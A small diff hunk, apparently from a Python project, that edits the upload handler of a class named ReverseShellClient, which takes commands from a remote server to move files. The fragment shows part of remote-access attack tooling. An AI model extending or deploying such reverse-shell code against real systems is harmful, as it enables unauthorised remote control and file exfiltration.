@@ -130,7 +130,9 @@ class ReverseShellClient:
         Gère la commande d'upload.
         @param command - La commande reçue du serveur contenant le chemin du fichier.
         """
+        command = command.replace("upload", "")
         parts = command.split(" ", 2)
+        logging.info(f"Parts: {parts}")
         file_path = parts[1]
         buffer_size = int(parts[2])
         try:
